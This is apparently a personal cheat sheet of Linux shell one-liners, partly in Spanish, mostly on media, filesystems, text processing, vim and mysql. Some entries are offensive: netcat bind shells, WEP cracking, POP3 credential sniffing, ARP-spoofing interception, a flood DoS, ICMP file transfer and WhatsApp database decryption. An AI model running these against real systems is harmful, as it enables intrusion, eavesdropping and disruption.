##### # wecam ascii live:  mplayer -tv driver=v4l2:gain=1:width=640:height=480:device=/dev/video0:fps=10:outfmt=rgb16 -vo aa tv://
##### # extract audio from video:  vid=video.avi; mplayer -ao "pcm:file=${vid%%.avi}.wav:fast" -vo null "$vid"
##### # mirror right side to left video: mplayer --vf=geq='p(X\,Y)*gt(W/2\,X)+p(W-1-X\,Y)*lt(W/2-1\,X)'
##### # alternate dimension:  
##### #  mplayer --vf=geq='128+(p(X\,Y)-128)*8' tv://
##### #  mplayer --vf=geq='(p(X\,Y*sin(X/512))-0)' tv:// 
##### # get video dimensions: mplayer -ao null -vo null --endpos=0.1 *.mp4 | grep VIDEO
##### # multiverse installed: aptitude search ~i -F "%c%a%M %s#%p#%d#"
##### # get declared functions in bash:  declare -F
##### # last date system update:  $ stat -c %y /var/cache/apt/pkgcache.bin
##### # date system (filesystem) creation:
##### #  ls -l /var/log/installer
##### #  tune2fs -l $(df -P / | tail -n1 | cut -d' ' -f1 ) | grep 'Filesystem created:'
##### #   dumpe2fs $(mount | \grep 'on \/ ' | awk '{print $1}') | grep 'Filesystem created:'
##### # last boot: date -d @$(grep ^btime /proc/stat | cut -d" " -f 2)
##### # last checked date:  $ tune2fs -l /dev/sda5 | grep "Last checked"
##### # update last checked date:   tune2fs -T now /dev/sda1  ||  # tune2fs -T 201412011200 /dev/sda1
##### # number of boots to scan disk:   sudo tune2fs -l /dev/sda5 | grep -i 'mount count'
##### # reserved blocks:   $ tune2fs -l /dev/sda5 | grep "^Reserved" (default 5%)
##### # change % reserved blocks: # tune2fs -m 3 /dev/sda5
##### # space reserved:
##### #  breserved=$(tune2fs -l /dev/sda5 | grep "Reserved block count" | awk '{print $4}')
##### #  bsize=$(tune2fs -l /dev/sda5 | grep "Block size:" | awk '{print $3}')
##### #  echo "$breserved*$bsize/1024/1024/1024" | bc -l # in gigas
##### # index directories (useful if there are directories with a large number of files):
##### # activate: tune2fs -O dir_index /dev/sda1 # for directories created from now on
##### #  # index directories created before: # e2fsck -D -f /dev/sda1
##### # show disk fragmentation:   e2freefrag /dev/sda5
##### # get filesystem:  file -sL /dev/sda5
##### # filenames not conform ISO 9660 level 2:  find . -regextype posix-extended -not -regex '.*/[A-Za-z_]*([.][A-Za-z_]*)?'
##### # ocr text recognition:  tesseract image.tif output.txt -l es
##### # ocr recognition:  $ gocr -i ~/Screenshot.png
##### # delete ^m character:  $ perl -pi -e "s/\r/\n/g" <file>
##### # find errors in php:  $ find -name "*.php" -exec php -l {} \; | grep -v "No syntax errors"
##### # check syntax errors in python: python -m file.py
##### # check syntax error by compiling: python -m py_compile check_imap.py
##### # profiling a file in python: python -m cProfile my_script.py
##### # find nasty file names: $ find -name "*[^a-zA-Z0-9._-]*"
##### # find files with two lines: pcregrep -M 'Slug:.*\nCategory' *.md | awk -F: /.md/'{print $1}
##### # find files without text: grep -L
##### # swap two lines in files: sed -i -r '$!N;s/^(\s*Slug:.*)\n(\s*Category:.*)/\2\n\1/;P;D' file
##### # delete lines beginning with: sed '/^XXXCategory/d' file
##### # delete last line: sed -i '$d' filename
##### # count character ocurrences in line: sed 's/[^¿]//g' file | awk '{print length}'
##### # trigonometric:  seq 8 | awk '{print "e(" $0 ")" }' | bc -l | awk '{print NR " " $0}'
##### # recover deleted file:  grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt
##### # recover deleted file still in use (demo):
##### #  $ cat mitm.flows | base64 | less    # file in use
##### #  $ stat mitm.flows
##### #  $ rm mitm.flows          # is deleted...
##### #
##### #  $ lsof | grep mitm.flows      # search pid of process using it (with lsof or ps)
##### #  $ ps -ef | grep mitm.flows
##### #  $ kill -STOP 3215        # prevent process to run and close the file
##### #  $ ls -l /proc/3215/fd        # check file descriptors used by that process
##### #  $ cp /proc/3215/fd/3 /new/path/to/mitm.flows  # recover file
##### # convert a string to camel case:  echo 'This is a TEST' | sed 's/[^ ]\+/\L\u&/g'
##### # camelcase to underscore:   $ echo thisIsATest | sed -E 's/([A-Z])/_\L\1/g'
##### # pretty print json: cat file.json | python -mjson.tool
##### # pretty print xml: xml_pp
##### # run command on paralel:  $ echo "uptime" | tee >(ssh host1) >(host2) >(host3)+
##### # executing commands in parallel:  $ time echo {1..5} | xargs -n 1 -P 5 sleep
##### # screenshot:   chvt 7 ; sleep 2 ; DISPLAY=:0.0 import -window root screenshot.png
##### # screenshot login screen:  chvt 7; sleep 5s; DISPLAY=:0 XAUTHORITY=/var/run/lightdm/root/:0 xwd -root -out ~/screenshot.xwd; convert ~/screenshot.xwd ~/screenshot.png; rm ~/screenshot.xwd  # ctrl+alt+f1 && sudo screenshot.sh
##### # frame screenshot:  import -frame screenshot.png
##### # screenshot:  fbgrag -s 2 pantallazo.png (api fbcat)
##### # frame screenshot: import outputfile.ps
##### # scrot -s /tmp/file.png # -s interactive (w/mouse), -d 3 (delay), -c (show countdown), -e command (exec)
##### # clossing a haging ssh session:   ~.
##### # suspend ssh session:  $ ~ ctrl-z
##### # timeout:
##### #  timeout ssh session:  export TMOUT=10
##### #  timeout 10 command arg1  # 10s
##### #  timeout 1m command arg1 arg2
##### #  timeout -s KILL 10 command 
##### #  timeout -k 30 1m command  # after 1m > sigterm, if still running, after 30s > sigkill
##### # check domain name susceptible of axfr attacks:  $ dig @somenameserver.net somedomainname.net axfr
##### # print answer:  $  dig +noall +answer barrapunto.com
##### # print domain of ip: $ dig +short -x 8.8.8.8
##### # get domain records: host -t soa example.com | nslookup -query=mx |  dig SOA
##### # print the exit of a command with a smily:   command; if [[ "$?" = 0 ]]; then echo ':)'; else echo ':('; fi
##### # running a script after reboot:  @reboot script.sh
##### # kill a process by mouse:  xkill -button any
##### # kill a process by used port:   kill -9 `lsof -t -i :port_number`
##### # pasar el contenido de la linea actual a un buffer y recuperarlo luego: ^u y ^y
##### # diff remote web pages:  diff <(wget -q -O - URL1) <(wget -q -O - URL2)
##### # binary diff $ bsdiff <oldfile> <newfile> <patchfile>
##### # apply path:  bspatch <oldfile> <newfile> <patchfile>
##### # broadcast yourself shell:  bash -i 2>&1 | tee /dev/stderr | nc -l 5000
##### # netcat nc port scanner:  
##### #  $ nc -z example.com 20-100
##### #  $ while ! nc -z terminus.ignaciocano.com 2279; do echo -n .; sleep 10; done; echo "done"
##### # copy files between computers:  (server) $ nc -l 9090 | tar -xzf - (client)  $ tar -czf dir/ | nc server 9090
##### # netcat ssl chat:
##### #   $ server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-cbc -a -k PaSSw; done | nc -l -p 8877 | while read so; do decoded_so=`echo "$so"| openssl enc -d -a -aes-256-cbc -k PaSSw`; echo -e "Incoming: $decoded_so"; done
##### #  client$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-cbc -a -k PaSSw ; done | nc localhost 8877 | while read so; do decoded_so=`echo "$so"| openssl enc -d -a -aes-256-cbc -k PaSSw`; echo -e "Incoming: $decoded_so"; done
##### # hping3 docs: http://wiki.hping.org/94
##### # send files over icmp hping3:   1) listening:  sudo hping3 --listen 10.0.2.254 -I wlan1 --sign MSGID1 | tee -a test.tx  # ip could be whatever
##### #      2) sending:   sudo hping3 10.0.2.254 --icmp --sign MSGID1 -d 1500 -c $(wc -c file.txt | awk '{f = $1/1500; i = int(f); print f == i ? i : i+1}') --file file.txt
##### #      packet size (-d): 1500 | de númber of packets (-d) depends of the file size
##### # expose an application throught net:  (server) $ mkfifo backpipe && nc -l 8080  0<backpipe | /bin/bash > backpipe (client) $ nc example.com 8080
##### # display text as though:   echo "text to be displayed" | pv -qL 10
##### # display test as fortune though:  $ fortune | pv -qL 10
##### # copy with progress bar:  pv file > file2
##### # limit transfer rate (bandwith):  $ cat /dev/urandom | pv -L 3m -Ss 100m | dd bs=1M count=100 iflag=fullblock ## 3mbps after 100mb
##### # r/w hard disk benchmark with dd:  dd if=/dev/zero of=test bs=64k count=16k conv=fdatasync
##### # mysql import with progress bar:  $ pv -n backup.sql | mysql -uroot -ppassword base
##### # send pv output to zenity: ex: $ pv -n  /dev/zero 2>&1 | zenity --progress --auto-close --title "Importando..."
##### # copy to remote host: dd if=/dev/sda bs=1G count=80 |pv -s80G |pbzip2 -c |ssh user@remote 'cat > /tmp/sda-80GB.bz2'
##### # exclude a column:  $ cut -f5 --complement
##### # crack wep WLAN_* default networks:
##### #    $wlandecrypter 20:33:64:30:50:13 WLAN_K7 diccionario
##### #    $airodump-ng --bssid 00:13:49:95:A3:73 -w captura --channel 7 ath0
##### #    $aircrack-ng -w diccionario captura-01.cap -K
##### # sniff pop3 authentication:  dsniff -i any 'tcp port pop3'
##### # which service by the given port:  $ getent services <port_number>
##### # translate:  translate() {
##### # wget -qO- "http://ajax.googleapis.com/ajax/services/language/translate?v=1.0&q=$1&langpair=${2:-en}|${3:-es}" | sed -E -n 's/[[:alnum:]": {}]+"translatedText":"([^"]+)".*/\1/p';
##### # echo ''
##### # return 0;
##### # }
##### # generate hash:  $ hashalot -s salt -x sha256 <<<"test"
##### # add latency:  tc qdisc add dev lo root handle 1:0 netem delay 100msec
##### # restore latency: tc qdisc del dev lo root
##### # continue job after logout:  $ nohup ./my-shell-script.sh &
##### # continue job after logout (if yet started):  ^Z and then $ disown -h %1
##### # continue download: wget --continue url || curl -C url
##### # execute a batch script: $ at -f backup.sh 10 am tomorrow
##### # print line and execute it:  $ echo <command>; !#:0-$
##### # intercept (hook) strerr/stdout of another process:  strace -ff -e trace=write -e write=1,2 -p SOME_PID
##### # show syscalls for parent and childs:  strace -T -f -p
##### # view 'open' calls made by a programm: strace -e open vpnc
##### # last command w/o the last argument:   !:-
##### # show apss that use internet:   ss -p
##### # execute process when load average is below a threshold (0.8):   echo "rm -rf /unwanted-but-large/folder" | batch
##### # download delicious bookmarks:  curl --user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'
##### # stop delete flash tracking:  for i in ~/.adobe ~/.macromedia ; do ( rm $i/ -rf ; ln -s /dev/null $i ) ; done
##### # loto.   $ seq -w 50 | sort -R | head -6 |fmt|tr " " "-"
##### # loto:  $ shuf -i 1-49 -n 6 | sort -n | xargs  ## shuf -i 1-100 -n15 | xargs -n5
##### # discovering hosts:  arp-scan --interface=eth0 --localnet
##### # discovering hosts:  netdiscover -i eth2 -r 192.168.0.100/24
##### # fingerprinting:  $ arp-fingerprint -o "--interface=eth0 --numeric" 192.168.1.1
##### # fingerprinting knowing mac:  $ arp-scan --interface=eth0 --destaddr=00:c0:9f:09:b8:db 192.168.1.1
##### # kernel 32 o 64 bits:  getconf LONG_BIT || arch || uname -m || $ lscpu | grep -i architecture
##### # cpu 32 o 64 bits: $ cat /proc/cpuinfo | grep -i flags | grep -q lm ; echo $?  ## IMPORTANT!!-> 0 if 64 bits, 1 otherwise
##### # grep flags /proc/cpuinfo | grep lm
##### # wireless intensity: cat /proc/net/wireless
##### # limit memory per script/program:  (ulimit -v 1000000; scriptname)
##### # change ulimit for user:  $ sudo sh -c "ulimit -s 8192000 && exec su user"
##### # exec vs eval: exec runs another shell AND exits, eval translates, runs and the continues
##### # throttle download:   aria2c --max-download-limit=100K file.link
##### # limit download limit: axel --max-speed=1024 link  # bytes per second
##### # using threads to download big file: axel -a -n 3 http://somelink-to-download/
##### # limit apt download: vim /etc/apt/apt.conf.d/02limit:   Acquire { http { Dl-Limit "1000"; }} # 1000 KB/s
##### # limit interface bandwith:
##### #  sudo wondershaper wlan0 1024 128  # in kb, remove: sudo wondershaper remove wlan0
##### #  clear:  sudo wondershaper clear wlan0
##### # limit bandwith program:  trickle -d 10 -u 10 firefox %u
##### # limit transfer rate (bandwith): tar -cj /backup | cstream -t 777k | ssh host 'tar -xj -C /backup'
##### # bandwith test: wget http://cachefly.cachefly.net/400mb.test
##### # bandwith test with iperf
##### #   server:    $ iperf -s
##### #   on client: $ iperf -c myserver.mydom
##### # download page:  wget --html-extension --convert-links -r -p -U Mozilla http://www.misitiodeenlaces.com/index.html
##### # download web page:  wget -rkc http://www.pagina_a_bajar
##### # download web:   wget -c -nd -r -l 0 -np
##### # get all url links:  $ mojo get www.ignaciocano.com 'a[href]' attr href
##### # download youtube video:  wget http://www.youtube.com/watch?v=dQw4w9WgXcQ -qO- | sed -n "/fmt_url_map/{s/[\'\"\|]/\n/g;p}" | sed -n '/^fmt_url_map/,/videoplayback/p' | sed -e :a -e '$q;N;5,$D;ba' | tr -d '\n' | sed -e 's/\(.*\),\(.\)\{1,3\}/\1/' | wget -i - -O surprise.flv
##### # download youtube audio: youtube-dl ht http://www.youtube.com/watch?v=dQw4w9WgXcQ --extract-audio --audio-format mp3
##### # create anonymous youtube playlist: http://www.youtube.com/watch_videos?video_ids=yVSZus3ElpU,2YoVLNE_fkI,_Fezno5X6Bs
##### # downloads images:   wget -nd -H -p -A jpg,jpeg,png,gif <url>
##### # recover flash tmp files:  for h in `find /proc/*/fd -ilname "/tmp/Flash*" 2>/dev/null`; do ln -s "$h" `readlink "$h" | cut -d' ' -f1`; done
##### # recover ext3 files:
##### #  unmount partition
##### #  dd if=/dev/zero of=imagen.img bs=1M count=1024  # empty file
##### #  mkfs -t ext3 imagen.img
##### #  mkdir /mnt/prueba
##### #  mount -t ext3 imagen.img /mnt/prueba  # check it is mounted with df -h, then create and delete files inside
##### #  umount /mnt/prueba
##### #  ext3grep imagen.img --restore-all
##### #  or: ext3grep imagen.img --restore-all --after date -d '2015-10-16 19:16:00' '+%s' --before `date -d ¿2015-10-16 20:00:00¿ ¿+%s¿
##### # create terminal:  python -c 'import pty; pty.spawn("/bin/bash")'
##### # perl interpreter:  perl -dwe 1 # exit with: exit;
##### # cambiar contraseña directorio cifrado ubuntu:  ecryptfs-rewrap-passphrase /home/.ecryptfs/$USER/.ecryptfs/wrapped-passphrase
##### # get twitter status:  wget http://twitter.com/users/show.xml?screen_name=javcasta  --output-document=/tmp/estado.txt
##### # last tweet:  lynx --dump twitter.com/karpoke | sed -n "132,135 p"
##### # create playlist:  fapg --format=m3u --output=~/path/to/album/list.pls ~/path/to/album
##### # backup mbr:  sudo dd if=/dev/sda of=copiaMBR.dat bs=512 count=1   to recover, exchange
##### # clone hard disk:   sudo dd if=/dev/hda |pv|dd of=/dev/hdb bs=1M
##### # split file:  split -bytes=600M --sufix-length=3 fagotto.tar.gz prefix     recover:  cat previx* > file.img.gz
##### # split string:   $ IFS=- read -r x y z <<< "$str"
##### # process string char by char:   $ while IFS= read -rn1 c; do something with $c; done <<< $str
##### # solve python indentation problems:  grep "^V[TAB]" python.file.py
##### # vim settings:
##### #  check indenting settings in vim:   :verbose set ai? cin? cink? cino? si? inde? indk?
##### #   disable indenting settings in vim:   :setl noai nocin nosi inde=<CR>
##### #   correct indentation in vim:   :se sw=4 et<CR>=GZZ
##### #  paste w/o indentation:  :set paste  (:set nopaste to turn off)
##### #   file  encoding in vim: :set fileencoding=latin1    :w    :e
##### #   volcar el contenido de un comando en vim   :r ! dmesg | head
##### #   volcar el contenido de un fichero en vim   :r /etc/fstab
##### #   delete dos characters   $ :set ff=unix  ?????:
##### # ipython
##### #  %edit # open editor
##### #  %edit -p # open editor with same data as the last time
##### #  %paste # from clipboard
##### #  %autoindent # togger autoindent
##### #  datetime? # getting help
##### #  %run script.py  # running script
##### #  %save hello.py 1-2 2-3  # save specific lines to file
##### #  %debug # activate debugger
##### #  %recall 21 # repeat command in line 21
##### #  !ls  # execute shell command
##### #  list_of_files = !ls  # assign a shell commando to a variable
##### #  %history  # show history
##### #  %pastebin [-d "data example" ] 20-22  # upload specified lines to pastebin and returns url
##### # sniff who are using wireless:  $ sudo ettercap -T -w out.pcap -i wlan0 -M ARP // //
##### # share terminal session:  $ mkfifo foo; script -f foo
##### # record terminal session:  $ ttyrec   ... play   $ ttyplay ttyrecord
##### # record terminal:   script -t -a 2> /tmp/time.txt /tmp/record.txt # api bsdutils
##### # replay terminal:   scriptreplay /tmp/time.txt /tmp/record.txt
##### # command separator  $ PS1=$(perl -e "print '~'x$((COLUMNS-9))")' \t\n${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
##### # create pdf from doc:  $ oowriter -pt pdf your_word_file.doc
##### # extract page from pdf: pdfseparate -f 3 -l 3 in.pdf out.pdf
##### # forward traffic:  sudo socat TCP-LISTEN:80,fork TCP:192.168.1.5:80
##### # draw kernel modules dependencies:   lsmod | perl -e 'print "digraph \"lsmod\" {";<>;while(<>){@_=split/\s+/; print "\"$_[0]\" -> \"$_\"\n" for split/,/,$_[3]}print "}"' | dot -Tpng | display -
##### # show kernel modules installed: $ find /lib/modules/$(uname -r)/ -iname "*$1*.ko*" | cut -d/ -f5-
##### # random avatar  curl -s "http://www.gravatar.com/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG" | display
##### # random background (wallpaper) from reddit:   wget -qO- http://www.reddit.com/r/wallpaper{,s}/.json | \grep -Eo '"url": "http://[^"]+' | \grep -Eo "http://.*" | sort -R | head -1
##### # random domain:   echo http://www.$( look . | \grep -E "^[a-z]{,12}$" | shuf | head -n 1 ).com
##### # save session cookie:  $ curl -c cookie.txt -d username=hello -d password=w0r1d http://www.site.com/login
##### # send cookie:  $ curl -b cookie.txt http://www.site.com/download/file.txt
##### # print from line to line:   $ awk 'NR >= 3 && NR <= 6' /path/to/file
##### # print between lines:  $ awk 'NR==3,NR==6{print $0}' file1
##### # print between words:  $ sed -n '/INICIO/,/FIN/p' fichero
##### # write in the second line:  awk 'NR==2 {print "new line"} 1'
##### # mostrar linea 3 de un fichero:   awk 'NR==3' file
##### # write only the lines longer than 64:  awk 'length > 64'
##### # exclude a column:  $ awk '{ $5=""; print }' file
##### # sincronizar directorios:  rsync -altgvb origen destino (b make backups)
##### # sync dir   $ rsync -avz ~/src ~/des/ (-a archivo (== -rlptgoD=> recursive, copy symlinks, preserve perms, preserve modification times, preserve group, omit directories, preserve dev files and special files) -v verbose, -z comprimir)
##### # refresh group membership without logout:   $ newgrp plugdev
##### # copiar sincronizar directorios:   rsync -auv  --progress  origen destino  | con --dry-run sólo muestra lo que va a hacer
##### # resume copy file (previously with scp): 
##### #  rsync --partial --progress --rsh=ssh $file_source $user@$host:$destination_file
##### #  rsync --rsh='ssh' -av --progress --partial 192.168.1.5:"/home/karpoke/Movies/Sharknado.3.Oh.Hell.No.2015.HDTV.x264-W4F[ettv]/sharknado.3.oh.hell.no.2015.hdtv.x264-w4f.mp4" .
##### # copy files (arcfour128 is faster): rsync -viHaAXv -S --recursive --progress -e "ssh -T -c arcfour128 -o Compression=yes -x" --exclude={"/dev/*","/proc/*","/sys/*","/tmp/*","/run/*","/mnt/*","/media/*","/lost+found"} /* root@192.168.1.8:/opt/installer/appliance
##### # talking vim:  daw, cis, dap, ci", di', da), di], ci}, cit, di>, ci,w, cia, dai, cir, cip, da,w,
##### # number of open files:  cat /proc/sys/fs/file-nr
##### # avoid ping: sudo nano /proc/sys/net/ipv4/icmp_echo_ignore_all
##### # shutdown at concrete hour or in 30 min:  sudo shutdown -h +30 | sudo shutdown -h 21:30
##### # advanced find w/o ls:  find $PWD -maxdepth 1 -printf '%.5m %10M %#9u:%-9g %#5U:%-5G [%AD | %TD | %CD] [%Y] %p\n'
##### # find unreadable file:   $ sudo -u apache find . -not -perm /o+r     ##  $ sudo -u apache find . -not -readable
##### # find last modified file in directory and subdirectories:   find . -type f -print0 | xargs -0 stat --printf '%Y :%y %12s %n\n' | sort -nr | cut -d: -f2- | head
##### # find modified files by a command: $ touch .tardis; the command ; find . -newer .tardis; rm .tardis;
##### # sony bravia dos:  hping -S 10.0.0.3 -p 2828 -i u1 --flood
##### # sed and save apart:  sed s/foo/bar/w myfile
##### # sed optimized replacement:   $ sed '/foo/ s/foo/foobar/g' <filename>
##### # sed remove blank lines:  $ sed '/^$/d'
##### # compress blank lines:  $ cat -s
##### # paquetes en estado hold:  $ aptitude search ~ahold
##### # marcar como hold: sudo apt-mark hold lua-md5
##### # desmarcar hold: sudo apt-mark unhold lua-md5
##### # capitalize:  $ sed "s/\b\(.\)/\u\1/g"
##### # contar el número de courrencias.  sed ?s/[sub_str]/[sub_str]\n/g? [text_file] | wc -l
##### # delete last line:   $ sed '$d' < input > output
##### # delete from line (inclusive):  sed -e '1,/^target$/d' prueba.txt
##### # show until line (exclusive):   sed -e '/^target$/,$d' prueba.txt
##### # cat show end lines:  cat -E
##### # list all commands on system:  compgen -c
##### # vim pager:  alias vless='/usr/share/vim/vimcurrent/macros/less.sh'
##### # mostrar particiones:   $ parted /dev/sda print
##### # recuperar vim:  :recovery
##### # kernel routing cache:   route -Cn
##### # free memory: /sbin/sysctl vm.drop_caches=3    =1 --> to free pagecache =2 --> to free dentries and inodes =3 --> to free pagecache, dentries and inodes
##### # free cache:  echo 3 > /proc/sys/vm/drop_caches
##### # ver tamaño descomprimido:  gzip -lv file.gz
##### # dar permisos para X11:   xhost +SI:localuser:mike.dropbox  (quitarlos con -SI)  (podemos hacerlos permanentes poniendo estos comandos en ~/.xsessionrc)
##### # filename from path:   $ filename=${path##*/}
##### # directory name from path:   $ dirname=${path%/*}
##### # mata un usuario que está usando un puerto: fuser -nk tcp puerto
##### # mata un usuario que está usando un fichero: fuser -k filename
##### # amixer sset Master 50 | 10+ | 70- | mute | unmute | toggle
##### # enable mic: amixer set Capture cap | nocap
##### # check if mic is enable: amixer get Capture
##### # show multimedia controls: amixer controls
##### # list all aliases:  bind -P
##### # edit another file in vim:  :e /path/to/another/file +99
##### # edit two files in vim:  vim -O file1 file2 .... also flag -o
##### # split widow in vim:   ^WV (vertical), ^WN (horizontal)... how to switch between them?
##### # increment value in vim:   ^A  (decrement with ^X)
##### # delete blank lines in vim: g/^$/d   (also in selection)
##### # autocompleatdo en vim:
##### #  rutas: ^X^F
##### #  palabras: ^X^N y ^X^P
##### #  línea: ^X^L
##### #  diccionario: ^X^K
##### #   special chars: ^V+code: ej: 181 = µ
##### # vim 'a' macro that moves to lines down and deletes one: qajjddq
##### # get printf value into var:  printf -v myvar "%c" {a..z}
##### # convert tabs to spaces: expand [-t 3]
##### # shutdow wireless interface:   sudo iwconfig wlan0 txpower off
##### # download wallpapers:  for i in {1..10}; do wget $(wget -O- -U "" "http://images.google.com/images?imgsz=xxlarge&hl=en&q=wallpaper&sa=N&start=$(($RANDOM%700+100))&ndsp=10" --quiet | grep -oe 'http://[^"]*\.jpg' | head -1);done
##### # open up directly:   for i in {1..1}; do wget -O- $(wget -O- -U "" "http://images.google.com/images?imgsz=xxlarge&hl=en&q=wallpaper&sa=N&start=$(($RANDOM%700+100))&ndsp=10" --quiet | grep -oe 'http://[^"]*\.jpg' | head -1) | display -;done
##### # run script when file changes:  while inotifywait .bash_aliases; do notify-send modificado; done
##### # music id3 tags:  id3tool -t title -a album -r artis -y year -n note -g genre (-l to show genre list)
##### # check logcheck rules:  egrep -f local-rules /var/log/mail.log
##### # awk without matching:  awk '!/matching string/'
##### # open last command to edit and then execute it:  fc
##### # reformat text columns:  fmt
##### # ip net calculator:  ipcalc
##### # highlight connections:   watch -d -n 1 "netstat -an | grep :8080"
##### # show connections: sudo nethogs eth0
##### # mysql:
##### #  CREATE USER foo IDENTIFIED BY 'mypassword';
##### #   CREATE USER foo IDENTIFIED BY PASSWORD '*CEE870801502ACAD44FA46CA2CA4F58C2B721A67';
##### #  DROP USER foo;
##### #  DROP USER foo@localhost;
##### #  GRANT ON privilegios TO 'usuario'@'host_de_conexion' IDENTIFIED BY 'password' WITH GRANT OPTION;
##### #  GRANT ALL PRIVILEGES ON *.* TO 'foo'@'localhost' IDENTIFIED BY 'mipassword' WITH GRANT OPTION;
##### #  HELP GRANT;
##### #  GRANT ALL ON db1.* TO 'foo'@'host1';
##### #  GRANT ALL ON db3.tabla1 TO 'foo'@'localhost';
##### #  GRANT ALL ON db1.* TO 'foo'@'%';
##### #  SHOW GRANTS for 'foo'@'localhost';
##### #  REVOKE SELECT ON test.* FROM 'foo'@'localhost';
##### #  REVOKE INSERT ON *.* FROM 'foo'@'localhost';
##### #  FLUSH PRIVILEGES; # sólo si se han cambiado de forma manual, como a continuación
##### #  INSERT INTO user VALUES('localhost','foo',mipassword'), 'Y','Y','Y','Y','Y','Y','N','N','N','Y','Y','Y','Y','Y');
##### #   list permissions:
##### #    SELECT user, host, password, select_priv, insert_priv, shutdown_priv, grant_priv FROM mysql.user
##### #   view permissions for individual databases.
##### #    SELECT user, host, db, select_priv, insert_priv, grant_priv FROM mysql.db
##### # capture mysql queries:  $ tshark -i any -T fields -R mysql.query -e mysql.query
##### # monitor sql queries:   watch -n 1 mysqladmin --user=<user> --password=<password> processlist
##### # check if mysqld is alive:  mysqladmin -uroot -p ping
##### # mean of mysql errors:  perror 31
##### # mysql selective dumping:  mysql> select * into outfile '/tmp/mifichero.txt' fields terminated by ',' lines terminated by '' from user where Host='localhost';
##### # mysql repair tables:  mysqlcheck --defaults-file=/etc/mysql/debian.cnf --auto-repair --all-databases
##### # mysql compare two databases (mostly queries in information_schema. As a summary, it checks partitions, row format, collation, constraints and so on):
##### #  mysqldiff --server1=user@host1 --server2=user@host2 dbtest1:dbtest2
##### #  mysqldiff --server1=user@host1:1234 --server2=user@host2:2345 dbtest1.table1:dbtest2.table2
##### #  mysqldiff --difftype=sql --server1=user@host1 --server2=user@host2 dbtest1:dbtest2
##### # start another screen:  Xephyr :1 -screen 800x600 ## DISPLAY=:1 xeyes
##### # analizar dumps memoria buscando virus, troyandos:  volatility
##### # tcpdump
##### #  We see that, piping the pcap (K, L, M) data as decoded packets has significant overhead in terms of number of captured queries, response time and reads requests completed.
##### #  Using the slow log has about 30% overhead in response time, nearly 20% drop in throughput but have highest number of queries captured.
##### #  Writing captured packets directly to binary file using the -w option has the lowest overhead in response time, around 10%. Throughput drops depending on how much filtering is involved though while also there are noticeable stalls when the operating system flushes the page cache. This side effect causes sysbench to drop to 0 reads or even reach response times of several seconds!
##### #  Streaming packets to a capable remote server in terms of network bandwidth, IO performance combined with -w option to capture binary data produces 20-25% overhead in response time, 10-15% drop in throughput, no stalls and number of queries captured as close to slow query log.
##### # analizar tráfico:  sudo tcpdump -ieth0 -s0 -q | grep -v ssh
##### # analizar tráfico smtp:  tcpdump -l -s0 -w - tcp dst port 25 | strings | grep -i 'MAIL FROM\|RCPT TO'
##### # make video from svn, git code:  gource -s 1 -a 1 -480x380 --hide date --title "svn" -r 25 -o - | ffmpeg -y -r 25 -f image2pipe -vcodec ppm -i - -vcodec libx264 -preset ultrafast -crf 1 -threads 0 -bf 0 gource.mp4
##### # capture GET or POST packets:  ngrep -q -W byline "^(GET|POST) .*"
##### # filter traffic:  ngrep -q -W byline "search" host www.google.com and port 80
##### # securely tunnel traffic:  $ sshuttle -r <server> --dns 0/0
##### # sshutle to specific server:   $ sshuttle -r <server> `dig +short <hostname>`
##### # get authoritative dns for domains:
##### #  $ dig +short NS digitalinternals.com
##### #  $ nslookup -type=NS digitalinternals.com
##### #  $ whois -i ns digitalinternals.com | grep -i "name .*:"
##### #  $ host -t ns digitalinternals.com
##### # benchmarking http:   $ siege -c20 www.google.co.uk -b -t30s
##### # avoid refresh with mitm:   $ mitmproxy --anticache
##### # ability to record and replay http interactions:  $ mitmdump -w user-signup  (stop record with ^C)
##### # replay record:   $ mitmdump -c user-signup | tail -n1 | grep 200 && echo "OK" || echo "FAIL"
##### # sum digits:  python -c "print sum(map(int,str(1234)));"
##### # screen capture:   avconv -v warning -f alsa -i default -f x11grab -r 15 -s wxga -i :0.0 -vcodec libx264 -preset ultrafast -threads auto -y -metadata title="Title here" ~/Video/AVCONV_REG.mp4
##### # net capture metadata (pcap): $ capinfos fuckyeah.pcap
##### # extract audio from video:   mencoder "${file}" -of rawaudio -oac mp3lame -ovc copy -o "${file%.*}.mp3"
##### # speed/slow video:  $ mencoder -speed 2 -o output.avi -ovc lavc -oac mp3lame input.avi
##### # obtain info from audio file:  $ sox file.mp3
##### # reproducing audio file: $ play tux.mp3
##### # recording audio file: $ rec -r 8000 -c 1 migrabacion.mp3
##### # convert audio file: $ sox tux.mp3 tux.ogg
##### # convert audio to video (m4a to mp4): ffmpeg -loop 1 -i image.jpg -i audio.m4a -c:v libx264 -c:a aac -strict experimental -b:a 192k -vf scale=720:-1 -shortest video-output.mp4
##### # accelerate playing audio file: $ sox tux.ogg acelerado.wav speed 2.0
##### # crop audio file: $ sox tux.wav recortado.ogg trim 60 10
##### # playing podcasts: $ play http://direccióndelaudioquequiero.ogg
##### # virus scan:   sudo /usr/bin/clamscan --recursive --infected ~/Descargas/
##### # console talking:
##### #  echo "Hola usuario de KDE" > /dev/pts/1
##### #  write user pts/3
##### #  echo "Chicos, necesito reiniciar el servidor. Guardad vuestros trabajos" | wall
##### #  talk user # requires talkd
##### # avoid receiving terminal messages from other users: mesg n || check with: mesg
##### # des/activar mensajes:  mesg [y/n]
##### # $ cu -l /dev/ttyACM0 -s 115200
##### # de que usuario es el programa escuchando en un puerto:  $ sudo fuser -v 111/tcp
##### # whatsapp extract:   openssl enc -d  -aes-192-ecb -in msgstore-1.db.crypt -out msgstore.db.sqlite -K 346a23652a46392b4d73257c67317e352e3372482177652c
##### # whatsapp crypt7:
##### #   Extract Key File: /data/data/com.whatsapp/files/key
##### #   Extract crypt7 file: /sdcard/WhatsApp/Databases/msgstore.db.crypt7
##### #
##### #   Extract Decryption Keys from "key" file extracted in step 1:
##### #       256-bit AES key:       hexdump -e '2/1 "%02x"' key | cut -b 253-316 > aes.txt
##### #       IV (initialisation vector):  hexdump -e '2/1 "%02x"' key | cut -b 221-252 > iv.txt
##### #   Strip Header in crypt7 File:
##### #     dd if=msgstore.db.crypt7 of=msgstore.db.crypt7.nohdr ibs=67 skip=1
##### #     Note: Size of header stripped file in bytes must be divisible by 16
